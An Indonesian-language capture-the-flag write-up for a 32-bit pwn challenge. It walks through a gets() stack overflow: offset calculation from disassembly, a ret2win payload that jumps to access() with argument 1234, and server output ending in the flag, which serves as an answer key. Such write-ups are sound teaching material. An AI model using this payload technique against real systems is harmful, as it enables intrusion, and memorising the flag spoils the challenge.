PWN
Queen Anne's Revenge
    Flag = JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}

Deskripsi:
"Aye, lad, can ye outsmart the wicked Blackbeard? if ye can, ye'll be the richest lad in all of Nassau!!!!!"
Dikasih service `nc` sama file binary `chall` beserta source code `main.c`. Kita disuruh ngecoh Blackbeard biar dikasih harta karun (bacaan: flag).

Solusi:
Pertama aku cek dulu binary-nya, biar tau mitigasi apa aja yang aktif:

[SS: terminal berisi file chall + readelf/checksec, keliatan "ELF 32-bit ... not stripped", no PIE]

    $ file chall
    chall: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
    $ readelf -l chall | grep GNU_STACK        (RW -> NX aktif, nggak masalah)
    $ objdump -t chall | grep " access$"
    080491e6 g F .text access

ELF 32-bit i386, dan yang paling penting: Type-nya EXEC alias **nggak pake PIE**, plus nggak ada canary. Berarti alamat fungsi itu statis dan bisa langsung dipakai. Terus aku baca source code-nya:

[SS: main.c kebuka di editor, baris gets(piratename) sama access(pin) ke-highlight]

    void access(int pin) {
        if (pin == 1234) {
            ... baca flag.txt dan print ...
        }
    }

    void menu() {
        char piratename[15];
        int pin;
        ...
        gets(piratename);          // <- nggak ada batas panjang!
        ...
        gets(&pin);
        if (strcmp(piratename,"blackbeard")==0 && pin == 123) {
            access(pin);           // <- access kepanggil dengan pin 123
        }
    }

Nah ini dia masalahnya. Fungsi `access()` cuma mau print flag kalau `pin == 1234`, tapi satu-satunya tempat `access()` dipanggil cuma di cabang "blackbeard" yang `pin == 123`. Kontradiksi! Mustahil dapet flag lewat alur normal. Belum lagi `gets(piratename)` yang buffer-nya cuma 15 byte tapi nggak dibatesin — ini mah undangan buffer overflow.

Aku buka disassembly `menu()` buat hitung jarak buffer ke return address:

[SS: objdump -d area menu(), tunjukin lea eax,[ebp-0x17] untuk gets piratename]

    lea eax, [ebp-0x17]    ; gets(piratename) -> buffer di ebp-0x17
    ...
    lea eax, [ebp-0x1c]    ; gets(&pin)

Buffer `piratename` ada di `ebp-0x17`. Jarak ke saved return address = 0x17 + 4 byte (saved EBP) = **27 byte**. Karena nggak ada PIE, tinggal timpa return address `menu()` dengan alamat `access()` yang udah aku catet tadi: `0x080491e6`. Binary 32-bit, jadi argumen `1234` buat `access` tinggal ditaruh setelah return address-nya. Payload-nya:

    'A'*27 + 0x080491e6 (access) + 0x080493a5 (main, biar aman) + 1234

Aku tulis exploit-nya:

[SS: exploit.py kebuka di editor, bagian payload di-highlight]

Pas dijalanin ke server:

[SS: TERPENTING - terminal exploit jalan, output dari "QUEEN ANNE'S REVENGE" sampe flag muncul]

    $ python3 exploit.py
    QUEEN ANNE'S REVENGE: Brig Treasure
    ye want riches? well then,
    identify yerself, ye scallywag: AAAAAAAAAAAAAAAAAAAAAAAAAAA<bytes sampah>
    hand over yer PIN: 1
    Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
    Here be yer treasure, matey:
    JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}

Nama kita ketimpa byte sampah jadi masuk cabang landlubber, terus pas `menu()` balik, return address-nya udah kita ganti ke `access()` — dan karena argumennya 1234, Blackbeard-nya nggak bisa ngapa-ngapain. Harta karun-nya kita bawa lari. Ye be the richest lad in all of Nassau, matey!

solved by: <nama tim>
